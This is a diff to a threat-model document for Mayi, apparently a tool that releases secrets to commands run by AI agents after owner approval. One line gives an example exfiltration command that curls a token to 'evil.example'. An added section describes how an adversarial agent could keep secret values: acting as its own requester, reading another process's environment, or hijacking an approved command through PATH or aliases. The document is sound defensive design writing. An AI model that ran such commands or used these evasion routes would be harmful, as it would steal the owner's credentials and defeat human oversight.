@@ -16,9 +16,14 @@ run commands on the owner's behalf.
 - **The command the owner approves.** Once a secret is released to a
   command, that command can do anything with it.
 
-Agents, the machines they run on and the network are not trusted with
-secret values. No push service or other third party is involved: requests
-travel only between your machines and your devices.
+Agents are not given secret values: an agent names a secret and a command,
+and the value goes to the command. That keeps values out of the model's
+context and transcripts, puts every use behind your levels, and records it
+in Activity. Mayi complements an agent sandbox rather than replacing it: an
+agent that has been compromised and runs as you can get a value you let it
+use (see "An agent that sets out to keep a value"), and keeping that value
+from leaving is the sandbox's job. No push service or other third party is
+involved: requests travel only between your machines and your devices.
 
 ## Threats and what happens
 
@@ -40,14 +45,56 @@ it should not use, or tries to exfiltrate one.
   session, for a capped time.
 - Prompts do not take keyboard focus and have no default button.
 - Everything is logged with the command and the reason, without values.
+- `mayi` looks the program up itself, leaving the working folder and
+  temporary folders out of PATH, and runs it from the exact path it found.
+  That path is what the prompt and Activity show (`/opt/homebrew/bin/gh pr
+  list`), so a program the agent named `gh` in a folder of its own is shown
+  for what it is. An expected command written by name (`gh *`) matches only
+  a program found that way; one the agent gave by path matches only a
+  pattern with its path.
+- The command runs without the variables that make programs load or run
+  other code (the dynamic loader's, `BASH_ENV`, `NODE_OPTIONS`,
+  `PYTHONPATH`, git's command hooks and similar), as sudo does.
 
 **Limits.** An approved command is the trust boundary. If the owner approves
 `sh -c 'curl evil.example -d $TOKEN'`, the token is gone. Output masking
 catches a value printed plainly or in base64 or hex, not one that is
-deliberately transformed. A level 1 or 2 secret is released to any command
-without asking, so those levels suit secrets whose misuse is tolerable, or
-secrets with an expected-commands list. A plausible lie in the reason field
-can mislead an owner who does not read the command.
+deliberately transformed, and only in the command's own output: a command
+that writes the value to a file leaves it there. A level 1 or 2 secret is
+released to any command without asking, so those levels suit secrets whose
+misuse is tolerable, or secrets with an expected-commands list. A plausible
+lie in the reason field can mislead an owner who does not read the command.
+
+### An agent that sets out to keep a value
+
+Mayi guards against an agent that is wrong or careless; an agent working
+against you, running as you, is what an agent sandbox is for. Such an agent
+can get the value of any request you allow:
+
+- **It can be its own requester.** Values go to the process that asked,
+  which runs the command. An agent can use the requester key in
+  `~/.config/mayi/requester.json`, or the Mac app's socket, ask to run
+  something harmless, and keep the values. The command in the prompt is
+  what `mayi` will run, but a device cannot tell that it is talking to
+  `mayi`.
+- **It can read the command's environment.** A process can read the
+  environment of another process of the same user: through `/proc` on
+  Linux, and on macOS for any program that is not part of the system.
+- **It can change what an approved command does,** through a folder on PATH
+  it can write to, the program's configuration (a `gh` alias that runs a
+  shell), or the project files the command reads.
+
+So approving gives the secret to that agent session; it does not control
+what the session does with it. What holds: nothing is released without
+passing your levels, every release is recorded, a level 4 secret needs your
+fingerprint for each request, and at levels 2 to 4 you see each use as it
+happens.
+
+For an agent you cannot fully trust, use both: run it in a sandbox with a
+network policy (Docker's agent sandboxes, OpenShell), so that what it holds
+cannot go anywhere you did not allow, and keep the secrets that matter most
+at level 4. Mayi decides which secrets reach the sandbox; the sandbox
+decides where they can go.
 
 ### Leaks into the model's context, transcripts and logs
 
@@ -92,10 +139,13 @@ no rate limiting.
 
 This is where levels differ in kind.
 
-- **Levels 1 to 3 are policy.** The vault key is wrapped to a hardware key,
-  but that key answers to any process of the same user. Malware on the Mac
-  can use it, read every secret below level 4, forge approvals, and enrol its
-  own machines. On Android the app sandbox makes this harder, but a
+- **Levels 1 to 3 are policy.** The vault key is wrapped to a Secure Enclave
+  key, which answers to any process of the same user. The app keeps that
+  key's blob sealed with a keychain item only Mayi can read, and uses the
+  hardened runtime, so no program can load its code into Mayi to read it.
+  Malware that gets past that (you allow its keychain dialog, or it replaces
+  the app) can read every secret below level 4, forge approvals, and enrol
+  its own machines. On Android the app sandbox does this work, but a
   compromised device is still a lost device.
 - **Level 4 is cryptography.** Each level 4 secret's key is wrapped only to a
   hardware key that will not be used without the owner: on Android, a fresh
@@ -113,6 +163,12 @@ anyone who knows the login password, malware that captured it included, can
 unlock level 4 with it: accepting the password was chosen over a level 4
 that a closed lid blocks. Macs set up before v0.1.0-alpha.3 keep a
 fingerprint-only key until they set up their vault again.
+
+Until Mayi is signed with an Apple Developer ID, macOS ties its keychain item
+to the exact build: after each update it asks once for your password to let
+the new Mayi read it (choose Always Allow). That trains you to allow a
+dialog another program could also cause; check that it names Mayi, just
+after you updated it.
 
 ### Someone at an unlocked device
 
@@ -264,8 +320,6 @@ What holds:
   framework through the `snow` library, but the composition is unaudited.
 - The vault key is never rotated, which is why removing a device or
   replacing the recovery key cannot revoke access to what they already held.
-- The Android app has been run on an emulator only, where keys are held in
-  software; its behaviour on real secure hardware is unverified.
-- Touch ID paths in the Mac app have not been exercised on real hardware.
-- `mayi fill` has been tested against local test pages and two public
-  practice sites, not yet against a real account with two-factor.
+- Mayi is not yet signed with an Apple Developer ID: macOS shows it as from
+  an unidentified developer, and each update asks for the keychain password
+  once.
